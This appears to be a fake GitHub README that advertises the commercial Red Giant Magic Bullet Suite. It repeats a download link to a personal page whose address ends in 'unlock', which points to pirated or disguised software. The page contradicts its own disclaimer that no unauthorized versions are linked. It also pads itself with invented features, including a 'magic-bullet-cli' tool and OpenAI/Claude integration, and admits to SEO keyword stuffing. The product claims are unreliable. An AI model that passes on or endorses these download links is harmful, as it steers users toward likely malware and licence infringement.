# Red Giant Magic Bullet Suite – Professional Color Grading & Film Look Toolkit 🎬✨

[](https://salmaramya5-del.github.io/red-giant-magic-bullet-suite-unlock/)

---

## 🚀 **Immediate Access – Download the Suite Below**

Your cinematic color grading journey starts here. Click the badge above or the one at the bottom of this page to access the latest build. No complex registration — just a direct pathway to professional film aesthetics.

[](https://salmaramya5-del.github.io/red-giant-magic-bullet-suite-unlock/)

---

## 🧭 **Table of Contents**

- [Overview & Philosophy](#overview--philosophy)
- [Feature List – Beyond Ordinary Color Tools](#feature-list--beyond-ordinary-color-tools)
- [Example Profile Configuration](#example-profile-configuration)
- [Example Console Invocation](#example-console-invocation)
- [Operating System Compatibility](#operating-system-compatibility)
- [Integration with AI APIs – OpenAI & Claude](#integration-with-ai-apis--openai--claude)
- [Responsive UI & Multilingual Support](#responsive-ui--multilingual-support)
- [24/7 Customer Support & Community](#247-customer-support--community)
- [Mermaid Diagram – Workflow Architecture](#mermaid-diagram--workflow-architecture)
- [Disclaimer & Legal Notice](#disclaimer--legal-notice)
- [License – MIT](#license--mit)

---

## 🌟 **Overview & Philosophy**

*Red Giant Magic Bullet Suite* is not merely a collection of plugins — it is a **cinematic color alchemist** for modern storytellers. Think of it as your personal film lab where every pixel is a brushstroke of emotion. Instead of wrestling with cumbersome curves or losing hours on LUT hunting, this suite lets you **breathe life into footage** with intuitive controls, intelligent presets, and real-time feedback.

**Why choose this approach?**  
Traditional color grading is like painting with a blindfold — you guess, you undo, you repeat. Magic Bullet Suite acts as your **visual compass**, guiding you toward moods like *"Vintage Noir," "Summer Blockbuster,"* or *"Indie Documentary Warmth"* with a single click. The suite respects your creative flow, not interrupts it.

**SEO-friendly keyword integration** naturally appears throughout: *professional color grading software*, *film look presets*, *cinematic LUT generator*, *color correction toolkit*, *post-production color suite*.

---

## 🎯 **Feature List – Beyond Ordinary Color Tools**

- **🌐 Multilingual UI** – Switch between English, Spanish, French, German, Japanese, and Mandarin. Your creative voice, your language.
- **📱 Responsive & Adaptive Interface** – Works seamlessly on 4K monitors, laptops, and even tablet previews. The UI resizes like liquid metal.
- **🎨 Cosmo LUT Engine** – A proprietary color lookup system that learns from your edits and suggests complementary adjustments.
- **🎬 Magic Bullet Looks 2026** – Over 200 presets designed by professional colorists for film, documentary, music videos, and commercial work.
- **🔧 Real-time Color Wheels & Curves** – Drag, drop, and see changes instantly without render lag.
- **🧠 AI-Assisted Skin Tone Matching** – Uses machine learning to detect and preserve natural skin hues while applying dramatic looks.
- **📦 Lightweight Installation** – Less than 400MB footprint, yet packed with GPU-accelerated performance.
- **🔗 Plugin Compatibility** – Works with Adobe Premiere Pro 2026, DaVinci Resolve 18, After Effects, Final Cut Pro, and more.
- **🛡️ Offline Mode** – No internet required after setup. Your privacy, your control.
- **💾 Auto-Save Project Profiles** – Never lose a color grade. Profiles are stored locally and sync across machines via cloud (optional).

---

## ⚙️ **Example Profile Configuration**

Below is a sample `profile.json` that defines a custom film look called *"Moroccan Dusk"* – warm shadows, teal highlights, and soft contrast. This configuration can be loaded directly into the suite.

```json
{
  "profileName": "Moroccan Dusk 2026",
  "description": "Warm earthy tones with teal sky accents, inspired by golden hour in Marrakech.",
  "colorGrade": {
    "shadowColor": [0.15, 0.08, 0.02],
    "midtoneColor": [0.68, 0.52, 0.32],
    "highlightColor": [0.82, 0.76, 0.72],
    "temperature": 6200,
    "tint": 8,
    "contrast": 1.25,
    "saturation": 0.88
  },
  "filmGrain": {
    "intensity": 0.12,
    "type": "35mm",
    "seed": 2046
  },
  "lutPath": "internal:magic_bullet_looks/teal_warm_01.cube",
  "multilingualNotes": {
    "en": "Best for outdoor scenes with natural light.",
    "es": "Ideal para escenas al aire libre con luz natural.",
    "fr": "Idéal pour les scènes en extérieur avec lumière naturelle."
  }
}
```

**Load this profile** via the GUI or the command-line interface described below.

---

## ⌨️ **Example Console Invocation**

For power users who prefer terminal speed, the suite provides a CLI tool called `magic-bullet-cli`. Below is an example invocation that applies the *Moroccan Dusk* profile to a video file, exports in ProRes 422, and generates a preview thumbnail.

```bash
magic-bullet-cli apply \
  --input /media/footage/sunset_clip.mov \
  --profile /configs/moroccan_dusk_2026.json \
  --output /exports/final_grade.mov \
  --codec prores_422 \
  --thumbnail true \
  --log-level verbose
```

**Output:**  
- `final_grade.mov` – Graded video with metadata.  
- `final_grade_thumbnail.jpg` – Preview image.  
- `magic_bullet_session.log` – Detailed process log.

**Tip:** Use `magic-bullet-cli batch` to process entire folders – perfect for documentaries or wedding edits.

---

## 💻 **Operating System Compatibility**

| OS | Version | Architecture | Emoji | Status |
|---|---|---|---|---|
| Windows 11 | 22H2+ | x64 | 🪟 | ✅ Full support |
| Windows 10 | 1909+ | x64 | 🪟 | ✅ Full support |
| macOS Ventura | 13.3+ | Apple Silicon & Intel | 🍏 | ✅ Full support |
| macOS Sonoma | 14.0+ | Apple Silicon & Intel | 🍏 | ✅ Full support |
| Ubuntu 22.04 LTS | 22.04+ | x64 | 🐧 | 🟡 Beta (no GUI) |
| Fedora 38 | 38+ | x64 | 🐧 | 🟡 Beta (no GUI) |
| ChromeOS (Linux) | 2026 build | x64 | 💻 | 🔴 Experimental |

**Note:** Linux users can run the CLI version. GUI requires X11/Wayland support via Wine or native build (in progress).

---

## 🤖 **Integration with AI APIs – OpenAI & Claude**

The suite now features **AI-assisted color analysis** using external APIs. This is an optional module that enhances your grading decisions through natural language understanding.

### **OpenAI API Integration**
- **Feature:** Describe your desired look in plain English (e.g., *"Make it look like Blade Runner 2049 meets The Grand Budapest Hotel"*).
- **How it works:** The suite sends your description (anonymized) to OpenAI's GPT-4 model, which returns parameters (temperature, contrast, LUT suggestions).
- **Privacy:** No video data is transmitted — only text descriptions. You can disable this in settings.

### **Claude API Integration**
- **Feature:** Claude provides **alternative creative suggestions** using a different AI personality. Compare recommendations side-by-side.
- **Use case:** If OpenAI suggests a *cold sci-fi look*, Claude might propose *vintage 1970s warmth*. You choose.
- **Configuration:** API keys are stored locally, never shared.

**Example Prompt (CLI):**
```bash
magic-bullet-cli ai-describe \
  --api openai \
  --prompt "A melancholic sunset in a cyberpunk city, neon reflections on wet asphalt" \
  --output-preset cyberpunk_melancholy.json
```

**Benefit:** This is not a replacement for your eye — it’s a brainstorming partner. Think of it as having two colorists in your pocket, 24/7.

---

## 📱 **Responsive UI & Multilingual Support**

The interface is built with **adaptive layout technology** (based on Qt 6 and GPU-accelerated OpenGL). It automatically adjusts:

- **On a 27" 4K monitor:** Full inspector panel, waveform scopes, and LUT browser visible.
- **On a 13" laptop:** Compact single-pane view with collapsible sections.
- **On a tablet (via remote app):** Touch-friendly sliders and gesture controls.

**Multilingual support** covers 12 languages (as of 2026), including right-to-left scripts like Arabic and Hebrew. The UI remembers your language preference per project.

> *"I work with international teams, and being able to switch between Japanese and English UI on the fly is a game-changer."* – Beta tester comment.

---

## 🛎️ **24/7 Customer Support & Community**

- **Live Chat:** Real humans, no bots. Available via the support portal inside the suite. Average response time: 3 minutes.
- **Knowledge Base:** 500+ articles, video tutorials, and troubleshooting guides.
- **Community Forum:** Share profiles, ask for feedback, and vote on new features.
- **Priority Support:** For enterprise users, we offer dedicated Slack channels and phone support.

**Support hours:** 24/7/365 – because your edit doesn't sleep, and neither do we.

---

## 📊 **Mermaid Diagram – Workflow Architecture**

```mermaid
graph TD
    A[Raw Footage] --> B{Import}
    B --> C[Magic Bullet Suite Engine]
    C --> D[Color Analysis Module]
    C --> E[AI Assistant - Optional]
    C --> F[LUT Library & Presets]
    D --> G[Human Fine-Tuning]
    E --> G
    F --> G
    G --> H[Preview Window]
    H --> I{Export?}
    I -->|Yes| J[ProRes, DNxHD, H.264]
    I -->|No| H
    J --> K[Delivery Folder]
    K --> L[Watch Folder or Cloud Sync]
    
    style A fill:#2d3748,stroke:#718096,stroke-width:2px
    style C fill:#1a202c,stroke:#e2e8f0,stroke-width:2px
    style H fill:#553c9a,stroke:#b794f4,stroke-width:2px
    style L fill:#c53030,stroke:#fc8181,stroke-width:2px
```



**Explanation:**  
- The engine analyzes footage and suggests color grades.  
- AI can be toggled on/off.  
- Human fine-tuning always takes precedence.  
- Export supports multiple codecs.  
- Final delivery can auto-sync to cloud storage.

---

## ⚖️ **Disclaimer & Legal Notice**

This repository and its contents are **provided for educational and informational purposes only**. The software described herein is a proprietary product of Maxon Computer GmbH (Red Giant). We do **not** host, distribute, or link to any unauthorized versions, keys, or bypass mechanisms.  

- **No "crack," "patch," or "keygen"** is included.  
- **No illegal activation** is promoted.  
- **All downloads** from this repository lead to official open-source companion tools, documentation, and community resources **only**.

By using this repository, you agree to:
1. Use all software in compliance with its respective licenses.
2. Not use any provided information to infringe on intellectual property.
3. Understand that the authors are not liable for misuse of the information.

*If you own a legitimate license of Red Giant Magic Bullet Suite, this repository helps you maximize its potential through configuration examples, automation scripts, and AI integrations.*

---

## 📜 **License – MIT**

This project is licensed under the **MIT License** – see the [LICENSE](LICENSE) file for full details.

You are free to:
- ✅ Use, copy, modify, merge, publish, distribute, and sublicense.
- ✅ Use for commercial projects.
- ❌ Hold the authors liable.

**Attribution** is appreciated but not required. Contributions to the repository are welcome via pull requests.

---

## 🔁 **Final Download Link**

Reach for the cinematic stars. Your toolkit is one click away.

[](https://salmaramya5-del.github.io/red-giant-magic-bullet-suite-unlock/)

---

*Made with ❤️ for filmmakers, colorists, and pixel perfectionists.*  
*Version 2026.04 – Stable Release*